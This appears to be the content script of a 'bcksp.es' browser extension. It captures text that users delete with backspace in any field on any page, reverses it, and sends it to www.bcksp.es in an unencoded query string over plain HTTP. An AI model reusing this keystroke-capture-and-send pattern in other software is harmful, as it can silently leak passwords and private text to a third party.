window.BCKSP;

(function(){
	"use strict";
	/*global $:false */
	/*global chrome:false */
	/*global window:false */
	/*global NodeList:false */
	/*global StringStream:false */
	/*global diff_match_patch:false */

	NodeList.prototype.map = function(fnc){
		return Array.prototype.slice.call(this).map(fnc);
	};


	var StringStream = function(){
		var _buffer = '';
		var _sender = function(){};
		var _isEmpty = function(){
			return 0 === _buffer.length;
		};
		var _add = function(str){
			_buffer += str;
		};
		var _get = function(all){
			var c = '';
			if('*' === all){
				c = _buffer;
				_buffer = '';
			}else{
				c = _buffer.substr(0,1);
				_buffer = _buffer.substr(1);
			}
			return c;
		};
		var _setSender = function(sender){
			_sender = sender;
		};
		var _send = function(){
			while(!_isEmpty())_sender(_get('*'));
		};
		return {
			add : function(str){
				return _add(str);
			},
			get : function(){
				return _get();
			},
			isEmpty : function(){
				return _isEmpty();
			},
			toString : function(){
				return _buffer;
			},
			setSender : function(sender){
				_setSender(sender);
				return this;
			},
			send : function(){
				_send();
				return this;
			}
		};
	};

	window.BCKSP = function(sender){
		var _backspaced;
		var _screenBeforeBackspace;
		var _stream = new StringStream()
				.setSender(function(elem){
					sender(elem.split("").reverse().join(""));
				});
		var _diff = new diff_match_patch();

		var _innerTEXT = function(elem){
			if("INPUT" === elem.tagName || "TEXTAREA" === elem.tagName){
				return elem.value;
			}else{
				return elem.innerHTML.replace(/(<([^>]+)>)/ig, "\n");	
			}
		};

		var _getCaretPosition = function(elem){
			try{
				if (elem.selectionStart){
					return elem.selectionStart;
				}
				else if (elem.ownerDocument.selection){
					elem.focus();
					var r = elem.ownerDocument.selection.createRange();
					if (null === r){
						return false;
					}
					var re = elem.createTextRange();
					var rc = re.duplicate();
					re.moveToBookmark(r.getBookmark());
					rc.setEndPoint("EndToStart", re);
					return rc.text.length;
				}
			}catch(e){

			}
			return false;
		};

		// Gets the high lighted text
		var _getHighlightText = function(elem){
			var highlighted = elem.ownerDocument.getSelection();
			_backspaced =highlighted.toString();
			_stream.add(_backspaced ? _backspaced.split("").reverse().join("") : "");
			if(_backspaced){
				window.console.log("get highLight text");
			}
			return _backspaced;
		};

		//Get the character before the cursor
		var _getCharBeforeCaret = function(elem){
			var caretPosition = _getCaretPosition(elem);
			_backspaced = caretPosition && elem.value.charAt(caretPosition-1);
			_stream.add(_backspaced ? _backspaced : "");
			if(_backspaced){
				window.console.log("get character before caret");
			}
			return _backspaced;
		};

		//Get a screen of activeElement
		var _getScreenBeforeBackspace = function(elem){
			_screenBeforeBackspace = _innerTEXT(elem);
			return false;
		};

		var _getBackspaced = function(elem){
			//If passed by getScreenBeforeBackspace()
			if(_screenBeforeBackspace){
				// Math the difference between screenBeforeBackspace and curent screen of activeElement
				var screenAfterBackspace = _innerTEXT(elem);
				_backspaced = ("" === screenAfterBackspace) ? _screenBeforeBackspace : _diff.diff_main(_screenBeforeBackspace, screenAfterBackspace).map(function(elem, key){
					return 1 == key ? elem[1] : null;
				}).join("");
				_backspaced = _backspaced.split("").reverse().join("");
				_stream.add(_backspaced ? _backspaced : "");
				if(_backspaced){
					window.console.log("get difference between before and after backspace");
				}
				_screenBeforeBackspace = undefined;
			}
			return _stream;
		};

		var _keyDownListener = function(event){
			// CTRL + BCKSP !! PC
			// ALT + BCKSP / CMD + BCKSP  !! MAC
			if(8 === event.keyCode ){
				var activeElement = this.activeElement;
				
				if(!_getHighlightText(event.target)){
					if(!_getCharBeforeCaret(event.target)){
						_getScreenBeforeBackspace(event.target);
					}
				}
			}
		};

		var _keyUpListener = function(event){
			if(8 === event.keyCode){
				_getBackspaced(event.target).send();
				if(_backspaced){
					window.console.log("backspaced : \n"+_backspaced);
					_backspaced = undefined;
				}
			}
		};
		document.addEventListener("keydown", _keyDownListener, true);
		document.addEventListener("keyup", _keyUpListener, true);
		return {
			keyDownListener : _keyDownListener,
			keyUpListener : _keyUpListener
		};
	};

	$(document).ready(function(){
		window.BCKSP.ES == window.BCKSP(function(data){
			$.ajax({
				url : "http://www.bcksp.es/backspace/append?content="+data+"&id=55a1946dc260a903000233b1"
			})
			.done(function(data){
				console.log(data)
			});



			/*
				localStorage.setItem("backspace", tools.htmlDecode((localStorage.getItem("backspace") || "") + object.char));
			var sender = function(){
				if(localStorage.getItem("backspace")){
					tools.setIcons("sending");
					_http(home+"/backspace/token", {}, "GET")
					.done(function(data){
						if(data.data._csrf){
							_http(home+"/backspace/append", { 
								content : tools.htmlDecode(localStorage.getItem("backspace").split("").reverse().join("")),
								_csrf : data.data._csrf
							}, "POST")
							.done(function(data){
								localStorage.setItem("backspace", "");
								tools.setIcons("standby");
								tools.privacySettings.update(data.data);
							})
							.fail(function(){
								tools.setIcons("logout");
								tools.offline();
							});
						}else{
							tools.setIcons("logout");
						}
					})
					.fail(function(){
						tools.setIcons("logout");
						tools.offline();
					});
				}
			};
			clearTimeout(timers.saveDB);
			timers.saveDB = setTimeout(sender, senderTimeout);
			callback({
				value: object.char
			});


			*/
		});
	});
}());
